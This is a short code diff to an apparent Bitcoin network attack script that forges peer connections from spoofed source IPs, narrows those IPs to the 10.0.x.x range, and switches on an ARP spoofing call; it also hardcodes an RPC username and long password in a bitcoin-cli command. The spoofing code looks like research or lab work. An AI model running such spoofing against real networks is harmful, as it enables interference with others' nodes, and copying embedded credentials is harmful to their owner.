@@ -56,7 +56,8 @@ def bitcoin(cmd):
 	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()
 
 def random_ip():
-	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
+	return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
+	#return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
 
 def version_packet(src_ip, dst_ip, src_port, dst_port):
 	msg = msg_version()
@@ -180,8 +181,8 @@ def initialize_fake_connection(src_ip, dst_ip):
 	#print(terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {dst_port} -j DROP'))
 
 
-	#mac_address = get_mac_address(network_interface)
-	#arp_spoof(src_ip, mac_address)
+	mac_address = get_mac_address(network_interface)
+	arp_spoof(src_ip, mac_address)
 
 	#ip_alias(src_ip)
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {src_ip} -j DROP')
